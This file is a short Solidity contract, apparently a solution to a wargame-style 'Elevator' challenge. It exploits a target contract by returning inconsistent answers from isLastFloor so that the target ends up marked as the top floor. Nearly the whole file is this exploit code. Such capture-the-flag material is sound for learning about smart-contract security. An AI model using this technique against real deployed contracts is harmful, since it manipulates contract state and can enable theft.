// SPDX-License-Identifier: MIT
// 0x10e65D891fCd84383c62F0E48E1c39EECa1223f5

pragma solidity ^0.8.0;

import"./Elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;
    
    constructor(address _targetAddress) public {
            target = Elevator(_targetAddress);
    }

    function isLastFloor(uint _lastFloor) public returns (bool) {
            toggle = !toggle;
            return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}